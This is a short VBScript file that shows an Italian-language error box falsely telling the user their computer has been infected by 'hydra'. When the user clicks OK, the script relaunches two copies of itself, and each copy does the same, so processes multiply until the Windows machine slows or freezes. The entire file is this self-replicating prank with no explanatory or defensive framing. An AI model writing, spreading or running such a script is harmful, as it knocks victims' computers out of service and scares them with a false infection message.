Dim WshShell
Set WshShell = WScript.CreateObject("WScript.Shell")

Do
    Dim Answer
    Answer = MsgBox("il tuo computer è stato infettato da hydra", 16 + 1, "Errore")
    If Answer = 1 Then ' Risposta OK
        Dim i
        For i = 1 To 2
            WshShell.Run "wscript " & Chr(34) & WScript.ScriptFullName & Chr(34)
        Next
        Exit Do
    End If
Loop
